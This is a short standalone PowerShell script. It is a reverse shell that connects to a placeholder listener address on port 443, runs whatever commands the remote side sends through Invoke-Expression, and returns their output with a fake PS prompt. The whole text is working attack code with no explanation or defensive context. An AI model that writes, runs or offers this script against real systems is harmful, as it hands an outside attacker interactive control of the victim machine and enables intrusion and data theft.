$client = [System.Net.Sockets.TCPClient]::new('<LISTENERIP>', 443)
[byte[]]$bytes = (0..65535).ForEach{ 0 }

$stream = $client.GetStream()
while ($i = $stream.Read($bytes, 0, $bytes.Length)) {
    $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)
    $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String)
    $prompt = $sendback + 'PS ' + $PWD.Path + '> '
    $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($prompt)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
